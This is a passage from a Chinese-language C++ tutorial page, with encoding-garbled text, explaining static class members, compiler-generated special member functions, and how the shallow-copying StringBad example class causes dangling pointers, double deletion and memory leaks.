ææ„å‡½æ•°</span></span><br><span class="line">StringBad::~StringBad() &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; object deleted, &quot;</span>; <span class="comment">// è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">    --num_strings;              <span class="comment">// å¯¹è±¡è®¡æ•°å‡å°‘</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot; left\n&quot;</span>; <span class="comment">// è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;              <span class="comment">// é‡Šæ”¾å†…å­˜ï¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹å…ƒå‡½æ•°: é‡è½½ &lt;&lt;</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> StringBad &amp; st) &#123;</span><br><span class="line">    os &lt;&lt; st.str;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç±»çœ‹èµ·æ¥ä¼¼ä¹èƒ½å·¥ä½œï¼šå®ƒåœ¨æ„é€ æ—¶åˆ†é…å†…å­˜ï¼Œåœ¨ææ„æ—¶é‡Šæ”¾å†…å­˜ã€‚ä½†æ˜¯ï¼Œå®ƒç¼ºå°‘ä¸€äº›å…³é”®çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ç¨åä¼šçœ‹åˆ°ã€‚</p><p><strong>é™æ€ç±»æˆå‘˜ (Static Class Members)</strong></p><p>åœ¨ <code>StringBad</code> ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸€ä¸ª <code>static int num_strings;</code>ã€‚è¿™æ˜¯ä¸€ä¸ª<strong>é™æ€æ•°æ®æˆå‘˜</strong>ã€‚</p><ul><li>  <strong>å…±äº«æ€§:</strong> é™æ€æ•°æ®æˆå‘˜ä¸å±äºä»»ä½•å•ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯è¢«ç±»çš„<strong>æ‰€æœ‰å¯¹è±¡å…±äº«</strong>ã€‚æ— è®ºåˆ›å»ºå¤šå°‘ä¸ª <code>StringBad</code> å¯¹è±¡ï¼Œ<code>num_strings</code> åªæœ‰ä¸€ä¸ªå‰¯æœ¬ã€‚</li><li>  <strong>ç”Ÿå‘½å‘¨æœŸ:</strong> é™æ€æ•°æ®æˆå‘˜åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œåœ¨ç¨‹åºç»“æŸæ—¶é”€æ¯ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸä¸ç¨‹åºçš„è¿è¡Œæ—¶é—´ç›¸åŒï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•ç±»å¯¹è±¡ï¼Œå®ƒä¹Ÿå­˜åœ¨ã€‚</li><li><strong>åˆå§‹åŒ–:</strong> é™æ€æ•°æ®æˆå‘˜<strong>å¿…é¡»åœ¨ç±»å®šä¹‰ä¹‹å¤–</strong>è¿›è¡Œåˆå§‹åŒ–ï¼ˆé€šå¸¸åœ¨å¯¹åº”çš„ <code>.cpp</code> æ–‡ä»¶ä¸­ï¼‰ï¼Œå¦‚ <code>int StringBad::num_strings = 0;</code>ã€‚åˆå§‹åŒ–æ—¶éœ€è¦ä½¿ç”¨ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>ï¼Œå¹¶ä¸”ä¸å†éœ€è¦ <code>static</code> å…³é”®å­—ã€‚<ul><li>  ä¾‹å¤–ï¼š<code>const</code> çš„æ•´å‹æˆ–æšä¸¾ç±»å‹çš„é™æ€æˆå‘˜ï¼ˆä»¥åŠ C++11 ä¸­çš„ <code>constexpr</code> é™æ€æˆå‘˜ï¼‰å¯ä»¥åœ¨ç±»å®šä¹‰å†…éƒ¨åˆå§‹åŒ–ã€‚</li></ul></li><li>  <strong>ç”¨é€”:</strong> å¸¸ç”¨äºè·Ÿè¸ªç±»çš„å®ä¾‹æ•°é‡ã€å…±äº«ç±»èŒƒå›´å†…çš„å¸¸é‡æˆ–æ ‡å¿—ç­‰ã€‚</li></ul><p>é™¤äº†é™æ€æ•°æ®æˆå‘˜ï¼Œè¿˜æœ‰**é™æ€æˆå‘˜å‡½æ•° (Static Member Functions)**ã€‚</p><ul><li>  <strong>å£°æ˜:</strong> åœ¨å‡½æ•°å£°æ˜å‰åŠ ä¸Š <code>static</code> å…³é”®å­—ã€‚</li><li>  <strong>æ—  <code>this</code> æŒ‡é’ˆ:</strong> é™æ€æˆå‘˜å‡½æ•°ä¸ä¸ä»»ä½•ç‰¹å®šå¯¹è±¡å…³è”ï¼Œå› æ­¤å®ƒä»¬<strong>æ²¡æœ‰ <code>this</code> æŒ‡é’ˆ</strong>ã€‚</li><li>  <strong>è®¿é—®é™åˆ¶:</strong> å®ƒä»¬åªèƒ½ç›´æ¥è®¿é—®ç±»çš„<strong>é™æ€æ•°æ®æˆå‘˜</strong>æˆ–å…¶ä»–<strong>é™æ€æˆå‘˜å‡½æ•°</strong>ã€‚å®ƒä»¬ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ï¼Œå› ä¸ºéé™æ€æˆå‘˜éœ€è¦é€šè¿‡å¯¹è±¡ï¼ˆ<code>this</code> æŒ‡é’ˆï¼‰æ¥è®¿é—®ã€‚</li><li>  <strong>è°ƒç”¨:</strong> å¯ä»¥é€šè¿‡ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦è°ƒç”¨ï¼ˆ<code>ClassName::static_func()</code>ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç±»çš„å¯¹è±¡è°ƒç”¨ï¼ˆ<code>object.static_func()</code>ï¼‰ï¼Œä½†æ¨èä½¿ç”¨å‰è€…ï¼Œå› ä¸ºå®ƒæ›´æ¸…æ™°åœ°è¡¨æ˜äº†å‡½æ•°çš„é™æ€å±æ€§ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šæ·»åŠ ä¸€ä¸ªé™æ€æˆå‘˜å‡½æ•°åˆ° StringBad</span></span><br><span class="line"><span class="comment">// stringbad.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringBad</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing private members ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing public members ...</span></span><br><span class="line">    <span class="comment">// é™æ€æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HowMany</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stringbad.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="comment">// å®šä¹‰é™æ€æˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StringBad::HowMany</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num_strings; <span class="comment">// å¯ä»¥è®¿é—®é™æ€æˆå‘˜ num_strings</span></span><br><span class="line">    <span class="comment">// return len; // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜ len</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">StringBad <span class="title">s1</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">StringBad <span class="title">s2</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of objects: &quot;</span> &lt;&lt; StringBad::HowMany() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€šè¿‡ç±»åè°ƒç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of objects: &quot;</span> &lt;&lt; s1.HowMany() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// é€šè¿‡å¯¹è±¡è°ƒç”¨ (ä¸æ¨è)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-1-2-ç‰¹æ®Šæˆå‘˜å‡½æ•°"><a href="#12-1-2-ç‰¹æ®Šæˆå‘˜å‡½æ•°" class="headerlink" title="12.1.2 ç‰¹æ®Šæˆå‘˜å‡½æ•°"></a>12.1.2 ç‰¹æ®Šæˆå‘˜å‡½æ•°</h3><p>C++ ç±»æœ‰ä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå¦‚æœç¨‹åºå‘˜æ²¡æœ‰æ˜¾å¼å®šä¹‰å®ƒä»¬ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤ç‰ˆæœ¬ã€‚è¿™äº›å‡½æ•°å¯¹äºæ§åˆ¶å¯¹è±¡çš„åˆ›å»ºã€é”€æ¯ã€å¤åˆ¶å’Œç§»åŠ¨è‡³å…³é‡è¦ï¼š</p><ol><li> <strong>é»˜è®¤æ„é€ å‡½æ•° (Default Constructor):</strong> å¦‚æœä½ <strong>æ²¡æœ‰</strong>å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒé€šå¸¸ä»€ä¹ˆä¹Ÿä¸åšï¼ˆå¯¹äºå†…ç½®ç±»å‹æˆå‘˜ï¼‰æˆ–è°ƒç”¨æˆå‘˜å¯¹è±¡çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚</li><li> <strong>ææ„å‡½æ•° (Destructor):</strong> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒé€šå¸¸ä»€ä¹ˆä¹Ÿä¸åšæˆ–è°ƒç”¨æˆå‘˜å¯¹è±¡çš„ææ„å‡½æ•°ã€‚å¯¹äºéœ€è¦é‡Šæ”¾èµ„æºçš„ç±»ï¼ˆå¦‚ <code>StringBad</code>ï¼‰ï¼Œ<strong>å¿…é¡»</strong>å®šä¹‰è‡ªå·±çš„ææ„å‡½æ•°ã€‚</li><li> <strong>å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor):</strong> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒçš„å‚æ•°é€šå¸¸æ˜¯åŒç±»å¯¹è±¡çš„ <code>const</code> å¼•ç”¨ï¼ˆä¾‹å¦‚ <code>StringBad(const StringBad&amp;)</code>ï¼‰ã€‚é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°æ‰§è¡Œ<strong>æˆå‘˜é€ä¸€å¤åˆ¶ (memberwise copy)</strong> æˆ–ç§°**æµ…å¤åˆ¶ (shallow copy)**ã€‚</li><li> <strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator):</strong> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒçš„å‚æ•°é€šå¸¸æ˜¯åŒç±»å¯¹è±¡çš„ <code>const</code> å¼•ç”¨ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘è°ƒç”¨å¯¹è±¡çš„å¼•ç”¨ï¼ˆä¾‹å¦‚ <code>StringBad&amp; operator=(const StringBad&amp;)</code>ï¼‰ã€‚é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ä¹Ÿæ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶)**ã€‚</li><li> <strong>ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11):</strong> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•å¤åˆ¶/ç§»åŠ¨æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç”Ÿæˆä¸€ä¸ªã€‚å‚æ•°æ˜¯åŒç±»å¯¹è±¡çš„å³å€¼å¼•ç”¨ï¼ˆ<code>StringBad(StringBad&amp;&amp;)</code>ï¼‰ã€‚é»˜è®¤æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨ã€‚</li><li> <strong>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11):</strong> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•å¤åˆ¶/ç§»åŠ¨æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç”Ÿæˆä¸€ä¸ªã€‚å‚æ•°æ˜¯åŒç±»å¯¹è±¡çš„å³å€¼å¼•ç”¨ï¼Œè¿”å›å¯¹è±¡å¼•ç”¨ï¼ˆ<code>StringBad&amp; operator=(StringBad&amp;&amp;)</code>ï¼‰ã€‚é»˜è®¤æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨ã€‚</li></ol><p><strong>å…³é”®é—®é¢˜ï¼šæˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶)</strong></p><p>å¯¹äºåƒ <code>int</code> æˆ– <code>double</code> è¿™æ ·çš„ç®€å•æ•°æ®æˆå‘˜ï¼Œæˆå‘˜é€ä¸€å¤åˆ¶å·¥ä½œå¾—å¾ˆå¥½ã€‚ä½†æ˜¯ï¼Œå¯¹äºæŒ‡é’ˆæˆå‘˜ï¼ˆå¦‚ <code>StringBad</code> ä¸­çš„ <code>char * str</code>ï¼‰ï¼Œæˆå‘˜é€ä¸€å¤åˆ¶ä»…ä»…æ˜¯<strong>å¤åˆ¶æŒ‡é’ˆçš„å€¼ï¼ˆåœ°å€ï¼‰</strong>ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆæ‰€æŒ‡å‘çš„æ•°æ®ã€‚è¿™å°±æ˜¯æ‰€è°“çš„<strong>æµ…å¤åˆ¶</strong>ã€‚</p><h3 id="12-1-3-å›åˆ°-StringBadï¼šå¤åˆ¶æ„é€ å‡½æ•°çš„å“ªé‡Œå‡ºäº†é—®é¢˜"><a href="#12-1-3-å›åˆ°-StringBadï¼šå¤åˆ¶æ„é€ å‡½æ•°çš„å“ªé‡Œå‡ºäº†é—®é¢˜" class="headerlink" title="12.1.3 å›åˆ° StringBadï¼šå¤åˆ¶æ„é€ å‡½æ•°çš„å“ªé‡Œå‡ºäº†é—®é¢˜"></a>12.1.3 å›åˆ° StringBadï¼šå¤åˆ¶æ„é€ å‡½æ•°çš„å“ªé‡Œå‡ºäº†é—®é¢˜</h3><p>è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼Œå®ƒä¼šéšå¼åœ°è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main_problem.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span> <span class="comment">// å‡è®¾ stringbad.h/cpp å¦‚ä¸Šå®šä¹‰ (æ²¡æœ‰è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callme1</span><span class="params">(StringBad sb)</span> </span>&#123; <span class="comment">// æŒ‰å€¼ä¼ é€’ï¼Œè°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String passed by value:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    \&quot;&quot;</span> &lt;&lt; sb &lt;&lt; <span class="string">&quot;\&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting an inner block.\n&quot;</span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">headline1</span><span class="params">(<span class="string">&quot;Celery Stalks at Midnight&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">headline2</span><span class="params">(<span class="string">&quot;Lettuce Prey&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">sports</span><span class="params">(<span class="string">&quot;Spinach Leaves Bowl for Dollars&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline1: &quot;</span> &lt;&lt; headline1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline2: &quot;</span> &lt;&lt; headline2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sports: &quot;</span> &lt;&lt; sports &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        callme1(headline1); <span class="comment">// è°ƒç”¨ callme1ï¼Œheadline1 è¢«å¤åˆ¶åˆ°å‚æ•° sb</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline1: &quot;</span> &lt;&lt; headline1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// å†æ¬¡æ‰“å° headline1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initialize one object to another:\n&quot;</span>;</span><br><span class="line">        StringBad sailor = sports; <span class="comment">// è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sailor: &quot;</span> &lt;&lt; sailor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Assign one object to another:\n&quot;</span>;</span><br><span class="line">        StringBad knot; <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">        knot = headline1; <span class="comment">// è°ƒç”¨èµ‹å€¼è¿ç®—ç¬¦ (è¿™é‡Œæ˜¯é»˜è®¤çš„)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;knot: &quot;</span> &lt;&lt; knot &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Exiting the inner block.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="comment">// ä½œç”¨åŸŸç»“æŸï¼Œheadline1, headline2, sports, sailor, knot çš„ææ„å‡½æ•°è¢«è°ƒç”¨</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of main()\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä½ è¿è¡Œè¿™æ®µä»£ç æ—¶ï¼ˆå‡è®¾ç¼–è¯‘å™¨ç”Ÿæˆäº†é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œä½ ä¼šé‡åˆ°ä¸¥é‡çš„é—®é¢˜ï¼Œå¾ˆå¯èƒ½ç¨‹åºä¼šå´©æºƒã€‚åŸå› å¦‚ä¸‹ï¼š</p><ol><li> <strong><code>callme1(headline1)</code>:</strong> å½“ <code>headline1</code> æŒ‰å€¼ä¼ é€’ç»™ <code>callme1</code> æ—¶ï¼Œä¼šè°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°æ¥åˆ›å»ºå‚æ•° <code>sb</code>ã€‚é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°æ‰§è¡Œæµ…å¤åˆ¶ï¼š<code>sb.str</code> è¢«è®¾ç½®ä¸ºä¸ <code>headline1.str</code> <strong>ç›¸åŒçš„å†…å­˜åœ°å€</strong>ã€‚</li><li> <strong><code>callme1</code> ç»“æŸ:</strong> å½“ <code>callme1</code> å‡½æ•°è¿”å›æ—¶ï¼Œå…¶å±€éƒ¨å˜é‡ <code>sb</code> è¢«é”€æ¯ï¼Œè°ƒç”¨ <code>sb</code> çš„ææ„å‡½æ•° <code>~StringBad()</code>ã€‚è¿™ä¸ªææ„å‡½æ•°æ‰§è¡Œ <code>delete [] sb.str;</code>ï¼Œé‡Šæ”¾äº† <code>headline1.str</code> æŒ‡å‘çš„å†…å­˜ï¼</li><li> <strong><code>headline1</code> çš„åç»­ä½¿ç”¨:</strong> å›åˆ° <code>main</code> å‡½æ•°åï¼Œ<code>headline1.str</code> ç°åœ¨æ˜¯ä¸€ä¸ª<strong>æ‚¬æŒ‚æŒ‡é’ˆ (dangling pointer)**ï¼Œå®ƒæŒ‡å‘å·²ç»è¢«é‡Šæ”¾çš„å†…å­˜ã€‚ä»»ä½•è¯•å›¾è®¿é—® <code>headline1</code> å†…å®¹çš„æ“ä½œï¼ˆå¦‚ <code>cout &lt;&lt; headline1</code> æˆ– <code>knot = headline1</code>ï¼‰éƒ½å°†å¯¼è‡´</strong>æœªå®šä¹‰è¡Œä¸º**ï¼ˆé€šå¸¸æ˜¯å´©æºƒï¼‰ã€‚</li><li> <strong><code>StringBad sailor = sports;</code>:</strong> åŒæ ·ï¼Œé»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ä½¿ <code>sailor.str</code> å’Œ <code>sports.str</code> æŒ‡å‘åŒä¸€å—å†…å­˜ã€‚</li><li><strong>ä½œç”¨åŸŸç»“æŸ:</strong> å½“ <code>main</code> å‡½æ•°çš„å†…éƒ¨ä½œç”¨åŸŸ <code>&#123;&#125;</code> ç»“æŸæ—¶ï¼Œæ‰€æœ‰å±€éƒ¨å¯¹è±¡ï¼ˆ<code>headline1</code>, <code>headline2</code>, <code>sports</code>, <code>sailor</code>, <code>knot</code>ï¼‰çš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚<ul><li>  <code>~StringBad()</code> for <code>knot</code> å¯èƒ½å°è¯•åˆ é™¤å·²ç»è¢« <code>callme1</code> ä¸­ <code>sb</code> çš„ææ„å‡½æ•°åˆ é™¤çš„å†…å­˜ï¼ˆå¦‚æœ <code>knot = headline1</code> å‘ç”Ÿåœ¨ <code>callme1</code> ä¹‹åï¼‰ã€‚</li><li>  <code>~StringBad()</code> for <code>sailor</code> ä¼šåˆ é™¤ <code>sports.str</code> æŒ‡å‘çš„å†…å­˜ã€‚</li><li>  <code>~StringBad()</code> for <code>sports</code> ä¼š<strong>å†æ¬¡å°è¯•åˆ é™¤</strong>åŒä¸€å—å†…å­˜ã€‚</li><li>  <code>~StringBad()</code> for <code>headline2</code> æ­£å¸¸å·¥ä½œã€‚</li><li>  <code>~StringBad()</code> for <code>headline1</code> å°è¯•åˆ é™¤å·²ç»è¢« <code>callme1</code> ä¸­ <code>sb</code> çš„ææ„å‡½æ•°åˆ é™¤çš„å†…å­˜ã€‚</li></ul></li></ol><p>è¿™ç§<strong>é‡å¤åˆ é™¤ (double deletion)</strong> åŒä¸€å—å†…å­˜çš„è¡Œä¸ºæ˜¯å¯¼è‡´ç¨‹åºå´©æºƒçš„å¸¸è§åŸå› ã€‚</p><h3 id="12-1-4-StringBad-çš„å…¶ä»–é—®é¢˜ï¼šèµ‹å€¼è¿ç®—ç¬¦"><a href="#12-1-4-StringBad-çš„å…¶ä»–é—®é¢˜ï¼šèµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="12.1.4 StringBad çš„å…¶ä»–é—®é¢˜ï¼šèµ‹å€¼è¿ç®—ç¬¦"></a>12.1.4 StringBad çš„å…¶ä»–é—®é¢˜ï¼šèµ‹å€¼è¿ç®—ç¬¦</h3><p>é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ <code>operator=</code> åŒæ ·æ‰§è¡Œæµ…å¤åˆ¶ï¼Œä¹Ÿä¼šå¯¼è‡´é—®é¢˜ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StringBad knot;        <span class="comment">// knot.str æŒ‡å‘ &quot;C++&quot; çš„å†…å­˜</span></span><br><span class="line"><span class="function">StringBad <span class="title">headline1</span><span class="params">(<span class="string">&quot;Celery Stalks at Midnight&quot;</span>)</span></span>; <span class="comment">// headline1.str æŒ‡å‘ &quot;Celery...&quot; çš„å†…å­˜</span></span><br><span class="line"></span><br><span class="line">knot = headline1; <span class="comment">// è°ƒç”¨é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>knot = headline1;</code> åï¼š</p><ol><li> <code>knot.len</code> è¢«è®¾ç½®ä¸º <code>headline1.len</code>ã€‚</li><li> <code>knot.str</code> è¢«è®¾ç½®ä¸º <code>headline1.str</code> çš„å€¼ï¼ˆå†…å­˜åœ°å€ï¼‰ã€‚</li></ol><p>ç»“æœï¼š</p><ul><li>  <code>knot.str</code> å’Œ <code>headline1.str</code> æŒ‡å‘åŒä¸€å—å†…å­˜ (â€œCeleryâ€¦â€)ã€‚</li><li>  <code>knot</code> åŸæ¥æŒ‡å‘çš„å†…å­˜ (â€œC++â€) çš„åœ°å€ä¸¢å¤±äº†ï¼Œè¿™å—å†…å­˜æ²¡æœ‰è¢« <code>delete</code>ï¼Œé€ æˆäº†**å†…å­˜æ³„æ¼ (memory leak)**ã€‚</li><li>  å½“ <code>knot</code> å’Œ <code>headline1</code> çš„ææ„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šå‘ç”Ÿ<strong>é‡å¤åˆ é™¤</strong>ã€‚</li></ul><p><strong>ç»“è®º:</strong></p><p>å¯¹äºç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»ï¼ˆå³ç±»å†…éƒ¨æœ‰æŒ‡é’ˆæˆå‘˜ï¼Œå¹¶ä¸”ç±»è´Ÿè´£ <code>new</code> å’Œ <code>delete</code> 